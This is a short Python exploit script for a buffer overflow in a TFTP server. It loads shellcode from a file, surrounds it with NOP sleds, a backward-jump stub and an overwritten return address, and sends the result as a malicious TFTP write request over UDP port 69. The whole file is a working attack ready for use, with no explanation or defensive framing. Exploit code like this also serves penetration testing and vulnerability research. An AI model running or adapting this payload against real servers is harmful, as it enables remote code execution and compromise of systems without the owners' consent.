#!/usr/bin/python3
#tftp server exploit
#Original findig :  Mati Aharoni
#Author : Uzeyir Destan

import sys,socket

if len(sys.argv) < 2:
	print("Usage is %s <ip>"%(sys.argv[0]))
	sys.exit(1)
host = sys.argv[1]
port = 69
shellcode =b""
with open("shellcode","rb") as f:
	byte = f.read(1)
	while byte != b"":
		shellcode += byte
		byte = f.read(1)
shellcode = b"\x90"*(486-len(shellcode))+shellcode
jmpbackward = b"\x90" * 16 + b"\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1"
jmpbackward += b"\x90" * (128-len(jmpbackward))
#payload = "A"*1520+"B"*4+"\x05\x96\x40"
payload =b"\x90"*906+shellcode+jmpbackward+b"\xeb\x80\x90\x90"+b"\x05\x96\x40"
try:
	s  = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
except:
	print("Socket failed")


evil = b"\x00\x02" + payload + b"\x00" + b"netascii\x00"

s.sendto(evil,(host,port))

print("Payload is sent with %d" % len(payload))
